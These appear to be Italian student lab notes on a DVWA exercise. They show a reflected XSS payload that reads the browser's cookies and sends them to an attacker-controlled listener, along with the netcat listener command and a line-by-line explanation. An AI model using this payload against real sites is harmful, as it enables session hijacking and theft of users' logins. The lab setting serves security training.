PRE BUILD WEEK 2

0 - configurazione di rete dispositivi attaccante e target:	Attaccante 192.168.13.100, Target 192.168.13.150
	configurazione security DVWA a LOW

1 - accedo alla pagina XSS reflected ed inserisco lo script:
	<script> var cookie=document.cookie; var img=new Image(); img.src = "http://192.168.104.100:4444/?cookie=" + 
		encodeURIComponent(cookie); </script>
	così ottengo sul mio webserver (precedentemente configurato: nc -lvnp 4444) i cookie.

	lo script utilizzato è suddiviso in:
		- var cookie=document.cookie;	viene creata la variabile cookie nella quale si allocano i cookie attivi
		- var img=new Image();		viene creata una richiesta HTTP GET invisibile
		- img.src="http://indirizzo/webserver:locale";		inoltro dei cookie sotto forma di
			parametro al webserver in ascolto
